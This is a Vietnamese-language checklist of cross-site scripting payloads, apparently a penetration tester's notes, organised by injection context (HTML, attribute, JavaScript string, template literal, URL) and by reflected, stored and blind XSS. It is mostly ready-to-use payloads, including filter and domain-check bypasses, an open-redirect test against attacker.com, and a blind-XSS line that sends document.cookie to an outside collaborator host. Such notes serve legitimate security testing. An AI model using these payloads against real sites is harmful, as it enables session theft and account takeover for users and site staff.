# CHECKLIST
- Tìm mọi nơi có input → xuất hiện lại trên UI:
  - Query string, form, search box, comment, profile, upload, redirect `?next=`, `?url=`,..
- Với mỗi input, cố gắng tìm:
  - Nó được render ở đâu? (HTML, thuộc tính, trong JS, trong URL…)
  - Có được lưu không? (stored XSS)
  - Có flow vào admin / staff / internal panel không? (blind XSS)
- Payload test nhanh (tùy context chỉnh lại):
  - `"><svg/onload=alert(1)>`
  - `<img src=x onerror=alert(1)>`
  - `"><script>alert(1)</script>`
  - `${alert(1)}`
  - `javascript:alert(1)`

## 1. HTML context 
- Input chui vào giữa các tag:
  `<div>Hello, <?= $_GET['name'] ?></div>`
- Hoặc trong template:
  `<div className={userInput}>`
- Checklist tấn công:
  - Thoát khỏi attribute
    - Payload: `" autofocus onfocus=alert(1) x="`
    - Hoặc: `" onmouseover=alert(1) "`
  - Nếu attribute không có quote:
    `<div class=<?= $clazz ?>>`
    -> Payload: `x onmouseover=alert(1)` (khoảng trắng tách attribute)
  - Thử inject thẻ mới: `"><svg/onload=alert(1)>`
  - Các attribute nhạy cảm: `src`, `href`, `data-xxx`, `style`, event `on*`

## Javascript context:
- Input xuất hiện trong `<script>`:
  ``` javascript
  <script>
  const name = "<?= $_GET['name'] ?>";
  </script>



- Trong template literal:
  ``` javascript
  <script>
  const tpl = `
    <?= $_GET['content'] ?>
  `;
  </script>

- Checklist tấn công:
  - Nếu nằm trong string `"..."`:
    - Payload: `";alert(1);//`
    - Hoặc: `";</script><svg/onload=alert(1)>`
  - Nếu trong template literal `...${userInput}...`:
    - Payload: `${alert(1)}`
  - Nếu input được dùng làm code:
    - `eval(userInput)`, `new Function(userInput)` → test thẳng `alert(1)`
  - Kiểm tra xem có encode `< > " '` không, nếu thiếu ký tự nào là chỗ để chui ra khỏi string/script

## 4. URL/`javascript:` context
- Input dùng làm URL:
  ``` java
  <a href="<?= $url ?>">Visit</a>
  <iframe src="<?= $url ?>"></iframe>
  <form action="<?= $redirect ?>">
  <button formaction="<?= $url ?>">

- Trong JS:
  ``` java
  window.location = userInput;
  iframe.src = userInput;

- Checklist tấn công:
  - Thử payload: `javascript:alert(1)`
  - Nếu có check domain:
    - `https://attacker.com#javascript:alert(1)`
    - `javascript:alert(1)//https://example.com`
    - Chuỗi chứa `youtube.com` nhưng vẫn là `javascript::`
      - `javascript:alert(1);/*youtube.com*/`
  - Kiểm tra redirect sau login / đăng ký / ủy quyền:
    - `?next=javascript:alert(1)`
    - `?redirect=//attacker.com` (open redirect, đôi khi kết hợp XSS khác)

## 5. Stored / Reflected / Blind XSS checklist
**Reflected XSS**
- Query string, form, header…
- Payload gọn (ít ký tự URL-encoded).
- Dùng burp suite để fuzz nhiều context.

**Stored XSS**
- Comment, profile, bài viết, message, tên file, metadata upload…
Tìm:
  - Nơi hiển thị lại data mình vừa nhập
  - Nơi data được hiển thị cho user khác / admin

**Blind XSS**
- Inject payload “gửi log về server mình”:
  `<svg/onload=fetch('https://your-burpcollab.net/?c='+document.cookie)>`
- Đặt vào các field mà staff/internal có thể xem:
  - Contact form, feedback, report abuse, tên file, note nội bộ...
